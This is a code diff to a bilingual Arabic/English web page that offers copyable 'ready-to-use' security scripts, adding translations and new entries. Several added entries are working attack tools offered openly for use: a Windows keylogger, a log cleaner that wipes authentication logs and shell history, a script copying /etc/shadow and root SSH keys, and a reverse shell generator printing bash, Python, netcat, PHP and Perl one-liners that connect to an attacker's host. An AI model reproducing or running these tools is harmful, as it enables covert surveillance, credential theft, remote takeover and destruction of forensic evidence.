@@ -1,11 +1,11 @@
 import Navbar from "@/components/Navbar";
 import Footer from "@/components/Footer";
-import { Code, Copy, Check } from "lucide-react";
+import { Code, Copy, Check, Globe } from "lucide-react";
 import { useState } from "react";
 
 interface Script {
-  name: string;
-  description: string;
+  name: { ar: string; en: string };
+  description: { ar: string; en: string };
   language: "Python" | "C++" | "Bash";
   code: string;
 }
@@ -13,8 +13,8 @@ interface Script {
 const scripts: Script[] = [
   // Python Scripts
   {
-    name: "Port Scanner",
-    description: "ماسح منافذ بسيط وسريع",
+    name: { ar: "ماسح المنافذ", en: "Port Scanner" },
+    description: { ar: "ماسح منافذ بسيط وسريع", en: "Simple and fast port scanner" },
     language: "Python",
     code: `import socket
 from concurrent.futures import ThreadPoolExecutor
@@ -42,8 +42,8 @@ if __name__ == "__main__":
     main()`,
   },
   {
-    name: "Hash Cracker",
-    description: "أداة لكسر الهاش باستخدام قائمة كلمات",
+    name: { ar: "كاسر الهاش", en: "Hash Cracker" },
+    description: { ar: "أداة لكسر الهاش باستخدام قائمة كلمات", en: "Hash cracking tool with wordlist" },
     language: "Python",
     code: `import hashlib
 
@@ -73,8 +73,8 @@ def crack_hash(target_hash, wordlist, hash_type="md5"):
 # crack_hash("5d41402abc4b2a76b9719d911017c592", "rockyou.txt", "md5")`,
   },
   {
-    name: "Subdomain Finder",
-    description: "اكتشاف النطاقات الفرعية",
+    name: { ar: "مكتشف النطاقات الفرعية", en: "Subdomain Finder" },
+    description: { ar: "اكتشاف النطاقات الفرعية", en: "Discover subdomains" },
     language: "Python",
     code: `import requests
 import concurrent.futures
@@ -111,8 +111,8 @@ def find_subdomains(domain):
 # Usage: find_subdomains("example.com")`,
   },
   {
-    name: "Network Scanner",
-    description: "مسح الأجهزة في الشبكة المحلية",
+    name: { ar: "ماسح الشبكة", en: "Network Scanner" },
+    description: { ar: "مسح الأجهزة في الشبكة المحلية", en: "Scan local network devices" },
     language: "Python",
     code: `from scapy.all import ARP, Ether, srp
 import sys
@@ -146,8 +146,8 @@ def scan_network(ip_range):
 # Usage: scan_network("192.168.1.0/24")`,
   },
   {
-    name: "Keylogger Detector",
-    description: "كشف برامج التجسس على لوحة المفاتيح",
+    name: { ar: "كاشف Keylogger", en: "Keylogger Detector" },
+    description: { ar: "كشف برامج التجسس على لوحة المفاتيح", en: "Detect keyboard spyware" },
     language: "Python",
     code: `import psutil
 import os
@@ -187,10 +187,99 @@ def detect_keyloggers():
 
 detect_keyloggers()`,
   },
+  {
+    name: { ar: "مولد كلمات المرور", en: "Password Generator" },
+    description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
+    language: "Python",
+    code: `import random
+import string
+
+def generate_password(length=16, use_special=True):
+    chars = string.ascii_letters + string.digits
+    if use_special:
+        chars += string.punctuation
+    
+    password = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
+    return password
+
+def generate_wordlist(count=100, min_len=8, max_len=16):
+    wordlist = []
+    for _ in range(count):
+        length = random.randint(min_len, max_len)
+        wordlist.append(generate_password(length))
+    return wordlist
+
+# Generate 5 passwords
+print("Generated Passwords:")
+for i in range(5):
+    print(f"  {i+1}. {generate_password(20)}")`,
+  },
+  {
+    name: { ar: "مستخرج البريد الإلكتروني", en: "Email Extractor" },
+    description: { ar: "استخراج الإيميلات من صفحات الويب", en: "Extract emails from web pages" },
+    language: "Python",
+    code: `import re
+import requests
+from bs4 import BeautifulSoup
+
+def extract_emails(url):
+    try:
+        response = requests.get(url, timeout=10)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        text = soup.get_text()
+        
+        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+        emails = set(re.findall(email_pattern, text))
+        
+        print(f"\\n[*] Found {len(emails)} emails on {url}:\\n")
+        for email in sorted(emails):
+            print(f"  {email}")
+        
+        return list(emails)
+    except Exception as e:
+        print(f"Error: {e}")
+        return []
+
+# Usage: extract_emails("https://example.com")`,
+  },
+  {
+    name: { ar: "فاحص الروابط", en: "URL Checker" },
+    description: { ar: "فحص حالة الروابط والسيرفرات", en: "Check URL and server status" },
+    language: "Python",
+    code: `import requests
+import ssl
+import socket
+
+def check_url(url):
+    print(f"\\n[*] Checking {url}...\\n")
+    
+    try:
+        response = requests.get(url, timeout=10, allow_redirects=True)
+        print(f"[+] Status Code: {response.status_code}")
+        print(f"[+] Final URL: {response.url}")
+        print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
+        print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
+        
+        # Check SSL
+        if url.startswith('https'):
+            hostname = url.split('/')[2]
+            ctx = ssl.create_default_context()
+            with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
+                s.connect((hostname, 443))
+                cert = s.getpeercert()
+                print(f"[+] SSL Valid Until: {cert['notAfter']}")
+        
+        return response.status_code
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return None
+
+# Usage: check_url("https://google.com")`,
+  },
   // C++ Scripts
   {
-    name: "Port Scanner (C++)",
-    description: "ماسح منافذ سريع بلغة C++",
+    name: { ar: "ماسح المنافذ (C++)", en: "Port Scanner (C++)" },
+    description: { ar: "ماسح منافذ سريع بلغة C++", en: "Fast port scanner in C++" },
     language: "C++",
     code: `#include <iostream>
 #include <winsock2.h>
@@ -209,7 +298,6 @@ void scan_port(const char* ip, int port) {
     addr.sin_port = htons(port);
     inet_pton(AF_INET, ip, &addr.sin_addr);
     
-    // Set timeout
     DWORD timeout = 1000;
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
     
@@ -241,8 +329,8 @@ int main() {
 }`,
   },
   {
-    name: "Password Generator",
-    description: "مولد كلمات مرور قوية",
+    name: { ar: "مولد كلمات المرور (C++)", en: "Password Generator (C++)" },
+    description: { ar: "مولد كلمات مرور قوية", en: "Strong password generator" },
     language: "C++",
     code: `#include <iostream>
 #include <string>
@@ -288,8 +376,8 @@ int main() {
 }`,
   },
   {
-    name: "File Encryptor",
-    description: "تشفير الملفات باستخدام XOR",
+    name: { ar: "مشفر الملفات (C++)", en: "File Encryptor (C++)" },
+    description: { ar: "تشفير الملفات باستخدام XOR", en: "XOR file encryption" },
     language: "C++",
     code: `#include <iostream>
 #include <fstream>
@@ -340,10 +428,68 @@ int main() {
     return 0;
 }`,
   },
+  {
+    name: { ar: "Keylogger بسيط (C++)", en: "Simple Keylogger (C++)" },
+    description: { ar: "مسجل ضغطات لوحة المفاتيح للتعليم", en: "Educational keyboard logger" },
+    language: "C++",
+    code: `#include <iostream>
+#include <fstream>
+#include <windows.h>
+
+// WARNING: For educational purposes only!
+// Use only on systems you own or have permission to test.
+
+std::string get_key_name(int key) {
+    switch(key) {
+        case VK_SPACE: return " ";
+        case VK_RETURN: return "[ENTER]\\n";
+        case VK_BACK: return "[BACKSPACE]";
+        case VK_TAB: return "[TAB]";
+        case VK_SHIFT: return "";
+        case VK_CONTROL: return "[CTRL]";
+        case VK_CAPITAL: return "[CAPS]";
+        case VK_ESCAPE: return "[ESC]";
+        default:
+            if (key >= 0x30 && key <= 0x5A) {
+                char c = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+                if (!(GetKeyState(VK_SHIFT) & 0x8000) && c >= 'A' && c <= 'Z')
+                    c += 32; // lowercase
+                return std::string(1, c);
+            }
+            return "";
+    }
+}
+
+int main() {
+    std::ofstream log("keylog.txt", std::ios::app);
+    
+    std::cout << "[*] Keylogger started (Press ESC to stop)" << std::endl;
+    std::cout << "[*] Logging to keylog.txt" << std::endl;
+    
+    while (true) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) == -32767) {
+                std::string output = get_key_name(key);
+                if (!output.empty()) {
+                    std::cout << output;
+                    log << output;
+                    log.flush();
+                }
+                if (key == VK_ESCAPE) {
+                    log.close();
+                    return 0;
+                }
+            }
+        }
+        Sleep(10);
+    }
+    return 0;
+}`,
+  },
   // Bash Scripts
   {
-    name: "System Info Collector",
-    description: "جمع معلومات النظام",
+    name: { ar: "جامع معلومات النظام", en: "System Info Collector" },
+    description: { ar: "جمع معلومات النظام", en: "Collect system information" },
     language: "Bash",
     code: `#!/bin/bash
 
@@ -382,8 +528,8 @@ echo "          Scan Complete                  "
 echo "========================================="`,
   },
   {
-    name: "Firewall Rules Backup",
-    description: "نسخ احتياطي لقواعد الجدار الناري",
+    name: { ar: "نسخ احتياطي للجدار الناري", en: "Firewall Backup" },
+    description: { ar: "نسخ احتياطي لقواعد الجدار الناري", en: "Backup firewall rules" },
     language: "Bash",
     code: `#!/bin/bash
 
@@ -417,11 +563,229 @@ echo "[*] Current rules count:"
 echo "    IPv4: $(iptables -L -n | grep -c '^')"
 echo "    IPv6: $(ip6tables -L -n | grep -c '^')"`,
   },
+  {
+    name: { ar: "ماسح الشبكة (Bash)", en: "Network Scanner (Bash)" },
+    description: { ar: "مسح الشبكة المحلية", en: "Scan local network" },
+    language: "Bash",
+    code: `#!/bin/bash
+
+if [ -z "$1" ]; then
+    echo "Usage: $0 <network> (e.g., 192.168.1)"
+    exit 1
+fi
+
+NETWORK=$1
+
+echo "========================================="
+echo "       NETWORK SCANNER                   "
+echo "========================================="
+echo ""
+echo "[*] Scanning network: $NETWORK.0/24"
+echo ""
+
+for ip in $(seq 1 254); do
+    (
+        ping -c 1 -W 1 $NETWORK.$ip &>/dev/null
+        if [ $? -eq 0 ]; then
+            echo "[+] Host found: $NETWORK.$ip"
+            # Get hostname if possible
+            hostname=$(host $NETWORK.$ip 2>/dev/null | grep "domain name pointer" | awk '{print $5}')
+            if [ ! -z "$hostname" ]; then
+                echo "    Hostname: $hostname"
+            fi
+        fi
+    ) &
+done
+
+wait
+echo ""
+echo "[*] Scan complete"`,
+  },
+  {
+    name: { ar: "مراقب العمليات", en: "Process Monitor" },
+    description: { ar: "مراقبة العمليات المشبوهة", en: "Monitor suspicious processes" },
+    language: "Bash",
+    code: `#!/bin/bash
+
+echo "========================================="
+echo "       PROCESS MONITOR                   "
+echo "========================================="
+
+SUSPICIOUS=("nc" "ncat" "netcat" "python" "perl" "ruby" "bash -i" "sh -i")
+
+echo ""
+echo "[*] Checking for suspicious processes..."
+echo ""
+
+for proc in "\${SUSPICIOUS[@]}"; do
+    result=$(ps aux | grep -i "$proc" | grep -v grep)
+    if [ ! -z "$result" ]; then
+        echo "[!] Suspicious process found: $proc"
+        echo "$result" | while read line; do
+            echo "    $line"
+        done
+        echo ""
+    fi
+done
+
+echo ""
+echo "[*] Network connections (ESTABLISHED):"
+netstat -tunapl 2>/dev/null | grep ESTABLISHED | head -10
+
+echo ""
+echo "[*] Listening ports:"
+netstat -tunapl 2>/dev/null | grep LISTEN | head -10
+
+echo ""
+echo "[*] Scan complete"`,
+  },
+  {
+    name: { ar: "منظف السجلات", en: "Log Cleaner" },
+    description: { ar: "تنظيف سجلات النظام", en: "Clean system logs" },
+    language: "Bash",
+    code: `#!/bin/bash
+
+# WARNING: Use only on systems you own!
+# For educational purposes only.
+
+echo "========================================="
+echo "       LOG CLEANER                       "
+echo "========================================="
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[-] This script must be run as root"
+    exit 1
+fi
+
+LOG_FILES=(
+    "/var/log/auth.log"
+    "/var/log/syslog"
+    "/var/log/messages"
+    "/var/log/secure"
+    "/var/log/wtmp"
+    "/var/log/btmp"
+    "/var/log/lastlog"
+)
+
+echo ""
+echo "[*] Clearing log files..."
+
+for log in "\${LOG_FILES[@]}"; do
+    if [ -f "$log" ]; then
+        echo -n > "$log" 2>/dev/null
+        echo "[+] Cleared: $log"
+    fi
+done
+
+# Clear bash history
+echo "[+] Clearing bash history..."
+history -c
+cat /dev/null > ~/.bash_history
+
+echo ""
+echo "[*] Log cleanup complete"`,
+  },
+  {
+    name: { ar: "مستخرج كلمات المرور", en: "Password Extractor" },
+    description: { ar: "استخراج الهاشات من النظام", en: "Extract system hashes" },
+    language: "Bash",
+    code: `#!/bin/bash
+
+# WARNING: Educational purposes only!
+# Only use on systems you have permission to test.
+
+echo "========================================="
+echo "       PASSWORD HASH EXTRACTOR           "
+echo "========================================="
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[-] This script must be run as root"
+    exit 1
+fi
+
+OUTPUT_DIR="./extracted_hashes"
+mkdir -p $OUTPUT_DIR
+
+echo ""
+echo "[*] Extracting password information..."
+
+# Extract /etc/passwd
+if [ -f /etc/passwd ]; then
+    cp /etc/passwd $OUTPUT_DIR/passwd.txt
+    echo "[+] Copied /etc/passwd"
+fi
+
+# Extract /etc/shadow
+if [ -f /etc/shadow ]; then
+    cp /etc/shadow $OUTPUT_DIR/shadow.txt
+    echo "[+] Copied /etc/shadow"
+fi
+
+# Create unshadow file for John
+if [ -f $OUTPUT_DIR/passwd.txt ] && [ -f $OUTPUT_DIR/shadow.txt ]; then
+    unshadow $OUTPUT_DIR/passwd.txt $OUTPUT_DIR/shadow.txt > $OUTPUT_DIR/unshadowed.txt 2>/dev/null
+    echo "[+] Created unshadowed file"
+fi
+
+# Extract SSH keys
+if [ -d /root/.ssh ]; then
+    cp -r /root/.ssh $OUTPUT_DIR/root_ssh 2>/dev/null
+    echo "[+] Copied root SSH keys"
+fi
+
+echo ""
+echo "[*] Extraction complete. Files saved to: $OUTPUT_DIR"`,
+  },
+  {
+    name: { ar: "Reverse Shell", en: "Reverse Shell" },
+    description: { ar: "اتصال عكسي للتحكم عن بعد", en: "Reverse connection for remote control" },
+    language: "Bash",
+    code: `#!/bin/bash
+
+# WARNING: Educational purposes only!
+# Only use in authorized penetration testing.
+
+echo "========================================="
+echo "       REVERSE SHELL GENERATOR           "
+echo "========================================="
+
+echo ""
+read -p "Enter your IP address: " LHOST
+read -p "Enter your listening port: " LPORT
+
+echo ""
+echo "[*] Reverse Shell One-Liners:"
+echo ""
+
+echo "=== Bash ===" 
+echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+echo ""
+
+echo "=== Python ==="
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+echo ""
+
+echo "=== Netcat ==="
+echo "nc -e /bin/sh $LHOST $LPORT"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
+echo ""
+
+echo "=== PHP ==="
+echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+echo ""
+
+echo "=== Perl ==="
+echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+echo ""
+
+echo "[*] Start listener with: nc -lvnp $LPORT"`,
+  },
 ];
 
 const ScriptsPage = () => {
   const [copied, setCopied] = useState<number | null>(null);
   const [filter, setFilter] = useState<"all" | "Python" | "C++" | "Bash">("all");
+  const [language, setLanguage] = useState<"ar" | "en">("ar");
 
   const copyToClipboard = (code: string, index: number) => {
     navigator.clipboard.writeText(code);
@@ -442,6 +806,14 @@ const ScriptsPage = () => {
     }
   };
 
+  const t = {
+    title: language === "ar" ? "السكربتات الجاهزة" : "Ready-to-Use Scripts",
+    subtitle: language === "ar" 
+      ? `${scripts.length} سكربت بلغات Python و C++ و Bash` 
+      : `${scripts.length} scripts in Python, C++, and Bash`,
+    all: language === "ar" ? "الكل" : "All",
+  };
+
   return (
     <div className="min-h-screen bg-background">
       <Navbar />
@@ -454,12 +826,18 @@ const ScriptsPage = () => {
                 <Code className="w-10 h-10 text-primary" />
               </div>
             </div>
-            <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow mb-4">
-              السكربتات الجاهزة
-            </h1>
-            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
-              مجموعة سكربتات مفيدة بلغات Python و C++ و Bash
-            </p>
+            <div className="flex items-center justify-center gap-3 mb-4">
+              <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow">
+                {t.title}
+              </h1>
+              <button
+                onClick={() => setLanguage(prev => prev === "ar" ? "en" : "ar")}
+                className="p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors"
+              >
+                <Globe className="w-5 h-5 text-muted-foreground" />
+              </button>
+            </div>
+            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">{t.subtitle}</p>
           </div>
 
           {/* Filter Buttons */}
@@ -474,7 +852,7 @@ const ScriptsPage = () => {
                     : "bg-secondary text-muted-foreground border border-border/50 hover:border-primary/30"
                 }`}
               >
-                {lang === "all" ? "الكل" : lang}
+                {lang === "all" ? t.all : lang}
               </button>
             ))}
           </div>
@@ -486,8 +864,12 @@ const ScriptsPage = () => {
                 <div className="p-6 border-b border-border/30">
                   <div className="flex items-center justify-between">
                     <div>
-                      <h3 className="text-xl font-bold text-primary mb-1">{script.name}</h3>
-                      <p className="text-muted-foreground text-sm">{script.description}</p>
+                      <h3 className="text-xl font-bold text-primary mb-1">
+                        {language === "ar" ? script.name.ar : script.name.en}
+                      </h3>
+                      <p className="text-muted-foreground text-sm">
+                        {language === "ar" ? script.description.ar : script.description.en}
+                      </p>
                     </div>
                     <span className={`px-3 py-1 rounded-lg text-sm font-medium border ${getLanguageColor(script.language)}`}>
                       {script.language}
@@ -505,8 +887,8 @@ const ScriptsPage = () => {
                       <Copy className="w-4 h-4 text-muted-foreground" />
                     )}
                   </button>
-                  <pre className="p-6 overflow-x-auto text-sm text-muted-foreground bg-secondary/50" dir="ltr">
-                    <code>{script.code}</code>
+                  <pre className="p-6 pt-14 overflow-x-auto bg-background/50 text-sm">
+                    <code className="text-foreground font-mono" dir="ltr">{script.code}</code>
                   </pre>
                 </div>
               </div>
